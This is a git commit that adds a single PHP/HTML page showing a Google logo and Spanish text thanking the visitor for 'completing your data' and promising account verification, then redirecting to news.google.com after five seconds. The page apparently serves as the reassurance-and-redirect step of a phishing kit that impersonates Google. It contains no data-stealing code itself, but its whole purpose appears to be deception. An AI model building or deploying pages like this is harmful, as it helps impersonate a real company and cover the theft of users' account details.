df85243e5e479bcd1568c2b1b1c7eceb1a39e9a4
supporthecnic <34765310+supporthecnic@users.noreply.github.com>
2017-12-22 06:19:57 -0300

    Add files via upload

---
+++ index2.php
@@ -0,0 +1,18 @@
+<!DOCTYPE html><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><meta name="viewport" content="width=300, initial-scale=1"><style>
+img{max-width:100%;}
+</style>
+<html>
+
+ <head>
+
+  <meta http-equiv="Refresh" content="5;url=https://news.google.com">
+
+ </head>
+
+ <body>
+
+  <center></h1><img src="https://www.technobuffalo.com/wp-content/uploads/2015/09/new-google-logo.gif">
+<h3>Gracias por completar tus datos.<br>Tu solicitud esta en proceso.<br>
+ Tu cuenta ser&#225; verificada en un momento.</body>
+
+</html>
